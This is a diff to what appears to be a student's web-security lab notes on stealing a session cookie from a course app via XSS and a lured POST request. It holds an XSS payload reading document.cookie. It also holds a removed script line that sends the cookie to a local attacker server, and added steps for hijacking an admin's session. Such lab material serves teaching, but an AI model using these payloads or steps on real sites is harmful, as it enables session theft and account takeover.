@@ -50,6 +50,20 @@ I want to inject a script thta gives me the session token:
 [Inspiration from lab 3](./WS3_%20XSS%20_%20CSRF.pdf)
 
 ```"><script>alert(document.cookie)</script>```
-```
-<script>var i=new Image(); i.src="http://localhost:8000/?"+document.cookie;</script>
-```
+
+A scenario would be the following:
+- Condition
+    - both attacker and victim need to be in the same network (it will be the UTCN one)
+- Attacker part
+    - Log into the websec3 app
+    - Craft a server that logs the session cookie of a user that is an admin (it can be found [here](./server.html), it's an html file) (localhost may be replaced with the actual ip of the local server)
+    - Then to run it, just insert the following command into a terminal that is in the same directory as the html file: `python -m http.server`
+    - Send the url of the server to the victim
+- Victim part
+    - Access the attacker's local server from browser
+    - press `Send POST Request` button
+    - Needs to log into the app
+- Attacker part (again)
+    - once the victim is logged, search for logs into the local server
+    - find his session id, then put it into the browser cookies
+    - reload - you should have been stolen the session id from the victim
